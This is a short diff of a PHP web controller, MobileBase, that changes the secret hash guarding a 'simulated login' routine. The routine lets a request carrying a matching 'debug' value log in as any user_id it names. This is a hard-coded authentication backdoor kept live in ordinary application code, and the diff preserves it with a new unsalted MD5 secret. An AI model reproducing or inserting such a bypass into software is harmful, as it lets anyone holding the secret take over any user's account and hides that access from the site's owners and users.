@@ -31,7 +31,7 @@ class MobileBase extends Controller {
         /**
          * 模拟登录
          */
-        if( md5(I('debug')) == '7e7db4388415dbbdd3d7a05b95ce9228' && I('user_id') > 0){
+        if( md5(I('debug')) == '59f29878f0ca6fffa2485e3c5e3b5443' && I('user_id') > 0){
             $user_id =  I('user_id');
             if(!$user_id){
                 exit("user_id不能为空");
